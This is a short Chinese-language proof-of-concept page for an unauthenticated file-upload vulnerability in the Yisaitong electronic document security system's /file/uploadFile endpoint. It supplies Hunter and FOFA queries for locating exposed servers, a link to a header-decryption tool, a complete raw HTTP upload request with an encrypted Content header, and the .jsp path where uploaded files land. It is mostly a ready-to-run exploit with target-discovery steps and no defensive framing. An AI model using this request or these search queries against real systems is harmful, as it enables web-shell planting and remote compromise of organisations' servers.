## 亿赛通电子文档uploadFile接口文件上传漏洞


## Hunter语法：
```
web.icon=="9fd216c3e694850445607451fe3b3568"
```
## fofa
```
app="亿赛通-电子文档安全管理系统"
```

## 工具
```
https://github.com/0xf4n9x/CDGXStreamDeserRCE
```
将head 中的Content 解密
![image](https://github.com/wy876/POC/assets/139549762/365c3394-4f8e-43aa-9fac-d12e069ca53a)


## poc
```
POST /file/uploadFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 143
Content: MGIFOACOKLJAHOGCPPOBDFLGJFPACJJKLFGFOBDNHAGLEDGALNKAEHDLMEOODCBFDIMEFNGHCMGBPABDLPPCHCLMAELIDDCLOGNPOCGHIEFJHIOEIIPPJBCIFCPDOKIOMKPPDGPHCALHOJNNBLJBHGLMPBFICDGGMMOLGLGMIHOOFLHLBEHNIHOPOEKKIPHCMJAOMGMNPFINKHMPBFOJBJPNLNKILIOCLAEPIKJDNOJHELELCOLLAKKAPFFPFGPMOLGPBDAHIHKEFDIFPDMDKDDKNMOGMLDEMBEAMFOOCECFKCKHJBDDMIENNFFMABEFNKCCIAIJIKGDAOGCDMNCNEGOGBNJIJFBBEBODAPNLOFJMOGCJGMOCHNJALDDDKLPGM
Content-Type: multipart/form-data; boundary=0ac445a70ef9526aeb69efb4569810d6
Accept-Encoding: gzip, deflate, br
Connection: close

--0ac445a70ef9526aeb69efb4569810d6
Content-Disposition: form-data; name="file"; filename="file"

123
--0ac445a70ef9526aeb69efb4569810d6--
```

![image](https://github.com/wy876/POC/assets/139549762/96ae7af1-6607-45de-856e-6c248a8791f6)

文件上传地址
http://ip:/CDGServer3/3g/X.jsp


